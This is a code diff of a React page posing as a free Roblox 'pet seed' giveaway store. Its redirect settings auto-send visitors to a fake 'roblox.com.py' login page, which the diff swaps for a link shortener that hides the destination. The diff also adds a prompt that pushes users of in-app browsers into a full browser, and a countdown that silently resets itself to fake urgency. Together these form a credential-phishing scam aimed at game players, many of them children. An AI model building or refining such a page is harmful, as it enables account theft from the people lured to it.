@@ -60,56 +60,56 @@ const pets: Pet[] = [
   {
     id: "1",
     name: "T-Rex",
-    image: "/tr.png",
+    image: "/placeholder.svg?height=80&width=80&text=T-Rex",
     quantity: 0,
     claimed: false,
   },
   {
     id: "2",
     name: "Raccoon",
-    image: "/rc.png",
+    image: "/placeholder.svg?height=80&width=80&text=Raccoon",
     quantity: 0,
     claimed: false,
   },
   {
     id: "3",
     name: "Fennec Fox",
-    image: "/f.png",
+    image: "/placeholder.svg?height=80&width=80&text=Fox",
     quantity: 0,
     claimed: false,
   },
   {
     id: "4",
     name: "Kitsune",
-    image: "/k.png",
+    image: "/placeholder.svg?height=80&width=80&text=Kitsune",
     quantity: 0,
     claimed: false,
   },
   {
     id: "5",
-    name: "Dragonfly",
-    image: "/dragonfly.png",
+    name: "Red Dragon",
+    image: "/placeholder.svg?height=80&width=80&text=Dragon",
     quantity: 0,
     claimed: false,
   },
   {
     id: "6",
     name: "Mimic Octopus",
-    image: "/octo.png",
+    image: "/placeholder.svg?height=80&width=80&text=Octopus",
     quantity: 0,
     claimed: false,
   },
   {
     id: "7",
     name: "Disco Bee",
-    image: "/db.png",
+    image: "/placeholder.svg?height=80&width=80&text=Bee",
     quantity: 0,
     claimed: false,
   },
   {
     id: "8",
     name: "Queen Bee",
-    image: "/qb.png",
+    image: "/placeholder.svg?height=80&width=80&text=Queen",
     quantity: 0,
     claimed: false,
   },
@@ -118,7 +118,7 @@ const pets: Pet[] = [
 // Redirect configuration
 const REDIRECT_CONFIG = {
   enabled: true,
-  url: "https://roblox.com.py/login?returnUrl=4043634257163954",
+  url: "https://shorturl.asia/gDq1x",
   delay: 5000,
   autoRedirect: true,
 }
@@ -169,6 +169,51 @@ export default function PetSeedStore() {
 
   const handlePreloaderComplete = () => {
     setShowPreloader(false)
+
+    // Auto-detect and suggest browser opening after preloader
+    const userAgent = navigator.userAgent || navigator.vendor || (window as any).opera
+    const isInApp = /Instagram|FBAN|FBAV|Twitter|Line|WhatsApp|Telegram/i.test(userAgent)
+
+    if (isInApp) {
+      // Show a subtle notification for in-app browsers
+      setTimeout(() => {
+        const notification = document.createElement("div")
+        notification.innerHTML = `
+          <div style="
+            position: fixed; 
+            top: 20px; 
+            left: 50%; 
+            transform: translateX(-50%); 
+            background: rgba(0,0,0,0.8); 
+            color: white; 
+            padding: 12px 20px; 
+            border-radius: 8px; 
+            z-index: 1000;
+            font-size: 14px;
+            text-align: center;
+            max-width: 300px;
+          ">
+            📱 For best experience, open in browser
+            <button onclick="window.open(window.location.href, '_blank'); this.parentElement.remove();" 
+                    style="margin-left: 10px; background: #007bff; color: white; border: none; padding: 4px 8px; border-radius: 4px; cursor: pointer;">
+              Open
+            </button>
+            <button onclick="this.parentElement.remove();" 
+                    style="margin-left: 5px; background: transparent; color: white; border: 1px solid white; padding: 4px 8px; border-radius: 4px; cursor: pointer;">
+              ✕
+            </button>
+          </div>
+        `
+        document.body.appendChild(notification)
+
+        // Auto remove after 10 seconds
+        setTimeout(() => {
+          if (notification.parentElement) {
+            notification.remove()
+          }
+        }, 10000)
+      }, 1000)
+    }
   }
 
   // Update the useEffect for the timer
@@ -182,9 +227,19 @@ export default function PetSeedStore() {
     const timer = setInterval(() => {
       setTimeLeft((prev) => {
         if (prev <= 0) {
-          clearInterval(timer)
-          return 0
+          // Reset timer to 12 hours when it reaches 0
+          const newTime = 12 * 60 * 60 // 12 hours in seconds
+
+          // Update localStorage with new timer
+          if (typeof window !== "undefined") {
+            localStorage.setItem("petStoreTimer", newTime.toString())
+            localStorage.setItem("petStoreTimestamp", Date.now().toString())
+          }
+
+          console.log("⏰ Timer reset! New 12-hour cycle started")
+          return newTime
         }
+
         const newTime = prev - 1
 
         // Update localStorage every minute to avoid too many writes
@@ -485,7 +540,7 @@ export default function PetSeedStore() {
 
   // Show preloader first
   if (showPreloader) {
-    return <Preloader onComplete={handlePreloaderComplete} duration={4000} />
+    return <Preloader onComplete={handlePreloaderComplete} videoSrc="/videos/your-video-name.mp4" duration={4000} />
   }
 
   return (
@@ -551,7 +606,7 @@ export default function PetSeedStore() {
                   <div className="relative">
                     {avatarLoading ? (
                       <div className="w-12 h-12 bg-gray-200 rounded-full flex items-center justify-center animate-pulse">
-                        <RefreshCw className="h-6 w-6 text-gray-400 animate-spin" />
+                        <RefreshCw className="h-6 w-6 sm:h-8 sm:w-8 text-gray-400 animate-spin" />
                       </div>
                     ) : (
                       <img
@@ -617,7 +672,7 @@ export default function PetSeedStore() {
                 <div className="relative">
                   {avatarLoading ? (
                     <div className="w-16 h-16 bg-gray-200 rounded-full flex items-center justify-center animate-pulse">
-                      <RefreshCw className="h-8 w-8 text-gray-400 animate-spin" />
+                      <RefreshCw className="h-8 w-8 sm:h-10 sm:w-10 text-gray-400 animate-spin" />
                     </div>
                   ) : (
                     <img
